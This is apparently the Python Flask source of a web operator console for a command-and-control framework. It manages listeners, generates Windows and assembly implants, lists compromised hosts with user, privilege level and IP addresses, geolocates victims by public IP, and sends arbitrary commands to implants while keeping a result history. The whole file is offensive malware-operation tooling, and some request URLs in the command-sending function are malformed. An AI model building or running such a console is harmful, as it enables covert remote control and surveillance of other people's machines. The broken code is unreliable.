from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import Services
from Utilities import constant as const
from Services.Implant_Generation import Assembly_Gen
from Services.Implant_Generation import Basic_Gen
from Services.Convert_Time import convert_time
from Services.Diff_Secondes import secdiff
from datetime import timezone, timedelta
import Take_Control
import datetime
import time
import json

app = Flask(__name__)
CORS(app)

result_history = []


@app.route('/Authentification', methods=['POST'])
def authentification():  # put application's code here
    form_data = request.form
    ip = form_data.getlist("ip")[0]
    port = form_data.getlist("port")[0]
    req = requests.get("http://" + ip + ":" + port + "/Listeners")

    if req.status_code == 200:
        const.TEAMSERVER_IP = ip
        const.TEAMSERVER_PORT = port
        return index()
    else:
        return render_template('Authentification.html')


@app.route('/')
def authentification_page():  # put application's code here
    return render_template('Authentification.html')


@app.route('/index')
def index():  # put application's code here

    count_connected = 0
    count_disconnected = 0
    ############################LISTENERS####################################

    doc = {}
    name_list = []

    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners"
    req = requests.get(url)
    content = req.text
    json_obj = json.loads(content)
    flag = 0

    while flag != len(json_obj):
        name_list.append(json_obj[flag]["name"])
        flag = flag + 1

    for name in name_list:
        url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners/" + name

        req = requests.get(url)

        content = req.text

        new_json_obj = json.loads(content)

        doc[new_json_obj["name"]] = new_json_obj["bindPort"]

    ############################IMPLANTS####################################

    docImplant = {}
    implant_id_list = []
    integrity_list = []
    Coordinate_list = []

    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants"
    req = requests.get(url)
    content = req.text

    json_obj = json.loads(content)

    flag = 0

    while flag != len(json_obj):
        implant_id_list.append(json_obj[flag]["metadata"]["id"])
        flag = flag + 1

    for id in implant_id_list:
        url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/" + id
        req = requests.get(url)
        content = req.text

        information_list = []

        json_obj = json.loads(content)
        information_list.append(json_obj["metadata"]["hostname"])
        information_list.append(json_obj["metadata"]["username"])
        information_list.append(json_obj["metadata"]["id"])
        information_list.append(json_obj["metadata"]["processName"])
        information_list.append(json_obj["metadata"]["integrity"])
        information_list.append(json_obj["metadata"]["localIP"])
        information_list.append(json_obj["metadata"]["publicIP"])


        integrity_list.append(json_obj["metadata"]["integrity"])
        response = requests.get(f'http://ip-api.com/json/{json_obj["metadata"]["publicIP"]}')
        if response.status_code == 200:
            data = response.json()
            lat = data['lat']
            lon = data['lon']
            Coordinate_list.append({'lat': lat, 'lon': lon, 'hostname': json_obj["metadata"]["hostname"], 'IP_Public': json_obj["metadata"]["publicIP"]})
        else:
            print(f'Failed to get location for IP {json_obj["metadata"]["publicIP"]}')

        # Convert date lasteen seen return by Implant (string) to date
        delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
        convert_timedelta = timedelta(hours=delta_time)
        lastseen = json_obj["lastSeen"]
        implant_date = Services.Convert_Time.convert_time(lastseen)
        convert_lastseen = convert_timedelta + implant_date
        information_list.append(convert_lastseen)

        # Format and convert actual time to string
        actual_date = datetime.datetime.now() - convert_timedelta
        test = actual_date.isoformat()
        SplitTime = test.split(".")
        local_time = SplitTime[0].replace("T", " ")

        # Format date lasteen seen return by Implant (string) to match with actual time string
        lastseen_split_point = lastseen.split(".")
        lastseen_reformate = lastseen_split_point[0].replace("T", " ")

        # Check if implant is disconnected
        bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)

        # Add status implant connected/disconnected in board
        if bool_checker:
            information_list.append("Connected")
            count_connected = count_connected + 1
        else:
            information_list.append("Disconnected")
            count_disconnected = count_disconnected + 1

        if json_obj["metadata"]["id"] not in docImplant:
            docImplant[json_obj["metadata"]["id"]] = list()
        docImplant[json_obj["metadata"]["id"]].extend(information_list)
    return render_template('index.html', doc=doc, docImplant=docImplant, count_disconnected=count_disconnected, count_connected=count_connected, integrity_list=integrity_list, Coordinate_list=Coordinate_list)


# Listener Section
@app.route("/Listener", methods=['GET'])
def listener_page():
    return render_template('Listener.html')


@app.route("/Listener/ShowListener", methods=['POST'])
def show_listener():
    form_data = request.form
    name = form_data.getlist("Name")[0]

    req = requests.request("get", "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners/" + name)
    return req.content


@app.route("/Listener/ShowListeners", methods=['POST'])
def show_listeners():
    req = requests.request("get", "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners")
    return req.content


@app.route('/Listener/CreateListener/', methods=['POST'])
def create_listener():
    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners"

    if request.method == 'GET':
        return f"The URL /data is accessed directly. Try going to '/form' to submit form"

    if request.method == 'POST':
        form_data = request.form

        name = form_data.getlist("Name")[0]
        port = form_data.getlist("Port")[0]

        data = {'name': name, 'bindPort': port}
        req = requests.post(url, json=data)

        if req.status_code == 201:
            return "<p>Listener Created</>"
        else:
            return "Error during listener creation"


@app.route('/Listener/DeleteListener', methods=['POST'])
def delete_listener():
    form_data = request.form
    name = form_data.getlist("Name")[0]
    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners/" + name
    req = requests.delete(url)
    if req.status_code == 204:
        return "<p>Listener " + name + " is deleted</p>"
    else:
        return "<p>Error during removing listener</p>"


# generate
@app.route("/Generate", methods=['GET'])
def generate_page():
    return render_template('Generate.html')


@app.route("/Generate/AssemblyGen", methods=['POST'])
def assembly_gen():
    form_data = request.form
    ip = form_data.getlist("TeamServerIP")[0]
    port = form_data.getlist("ListenerPort")[0]
    return Assembly_Gen.main(ip, port)


@app.route("/Generate/WindowsGen", methods=['POST'])
def windows_gen():
    form_data = request.form
    ip = form_data.getlist("TeamServerIP")[0]
    port = form_data.getlist("ListerPort")[1]

    return Basic_Gen.main("windows", ip, port)

# board
@app.route("/Board", methods=['GET', 'POST'])

def board_page():
    ############################LISTENERS####################################
    doc = {}
    name_list = []

    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners"
    req = requests.get(url)
    content = req.text
    json_obj = json.loads(content)
    flag = 0

    while flag != len(json_obj):
        name_list.append(json_obj[flag]["name"])
        flag = flag + 1

    for name in name_list:
        url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Listeners/" + name

        req = requests.get(url)

        content = req.text

        new_json_obj = json.loads(content)

        doc[new_json_obj["name"]] = new_json_obj["bindPort"]
    ############################IMPLANTS####################################
    docImplant = {}
    implant_id_list = []

    url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants"
    req = requests.get(url)
    content = req.text

    json_obj = json.loads(content)

    flag = 0

    while flag != len(json_obj):
        implant_id_list.append(json_obj[flag]["metadata"]["id"])
        flag = flag + 1

    for id in implant_id_list:
        url = "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/" + id
        req = requests.get(url)
        content = req.text

        information_list = []

        json_obj = json.loads(content)
        information_list.append(json_obj["metadata"]["hostname"])
        information_list.append(json_obj["metadata"]["username"])
        information_list.append(json_obj["metadata"]["id"])
        information_list.append(json_obj["metadata"]["processName"])
        information_list.append(json_obj["metadata"]["integrity"])
        information_list.append(json_obj["metadata"]["localIP"])

        # Convert date lasteen seen return by Implant (string) to date
        delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
        convert_timedelta = timedelta(hours=delta_time)
        lastseen = json_obj["lastSeen"]
        implant_date = Services.Convert_Time.convert_time(lastseen)
        convert_lastseen = convert_timedelta + implant_date
        information_list.append(convert_lastseen)

        # Format and convert actual time to string
        actual_date = datetime.datetime.now() - convert_timedelta
        test = actual_date.isoformat()
        SplitTime = test.split(".")
        local_time = SplitTime[0].replace("T", " ")

        # Format date lasteen seen return by Implant (string) to match with actual time string
        lastseen_split_point = lastseen.split(".")
        lastseen_reformate = lastseen_split_point[0].replace("T", " ")

        # Check if implant is disconnected
        bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)

        # Add status implant connected/disconnected in board
        if bool_checker:
            information_list.append("Connected")

        else:
            information_list.append("Disconnected")

        if json_obj["metadata"]["id"] not in docImplant:
            docImplant[json_obj["metadata"]["id"]] = list()
        docImplant[json_obj["metadata"]["id"]].extend(information_list)

        docImplant = docImplant
    return render_template('Board.html', doc=doc, docImplant=docImplant)

#Implants

@app.route("/Implant", methods=['GET'])
def implant_page(resultat =""):
    return render_template('Implant.html',resultat=resultat)

@app.route("/Implant/ShowImplant", methods=['POST'])
def show_implant():
     req = requests.request("get", "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants")
     return render_template('Implant.html',resultat=req.content)

@app.route("/Implant/ShowImplantByID", methods=['POST'])
def show_implant_by_id():

     form_data = request.form
     name = form_data.getlist("Name")[0]

     req = requests.request("get", "http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/" + name)
     return req.content

@app.route("/TakeControl/TakeControl", methods=['POST'])
def take_control():

     id_implant = request.form['id_implant']
     return render_template('TakeControl.html', mon_param=id_implant)

# Take Control
@app.route("/TakeControl", methods=['GET'])
def take_control_page():
    return render_template('TakeControl.html')


@app.route('/TakeControl/Implant', methods=['POST'])
def page_suivante():
    mon_param = request.args.get('id_implant')
    return f"Vous avez saisi : {mon_param}"

@app.route('/TakeControl/send_command', methods=['POST'])
def send_command():
    # récupération de la commande envoyée depuis le formulaire
    arg = []
    json_obj = ""
    command = ""
    com = request.form['command']
    print("com: " + str(com))
    hidden_value = request.form['id_implant']
    task = Take_Control.take_control_menu(hidden_value,com)
    print(task)
    response = requests.get('http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/' + hidden_value + '/tasks/' + task)
    content = response.text
    print("Content : " + content)
    time.sleep(2)

    # Attendre que la tâche soit terminée et récupérer le résultat
    while response.text == "task not found":

            response = requests.get('http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/'+hidden_value + '/tasks/'+ task )
            print(response)
            content = response.text
            print(content)
            if content == "task not found":
                print("Content : " + content)
                break
            json_obj = json.loads(content)
            print(json_obj)
            time.sleep(2)

    if json_obj == "" :
        json_obj = json.loads(content)
        print(json_obj)
    # Ajouter la commande et le résultat à l'historique des résultats
    result_history.append({'command': com + str(arg) , 'result': json_obj["result"]})

    # Retourner le résultat de la commande au format JSON
    return render_template('TakeControl.html', mon_param=hidden_value)

@app.route('/TakeControl/result_history', methods=['GET'])
def get_result_history():
    # retourner l'historique des résultats au format JSON
    print(result_history)
    return jsonify(result_history)


if __name__ == '__main__':

    app.run(debug=True)
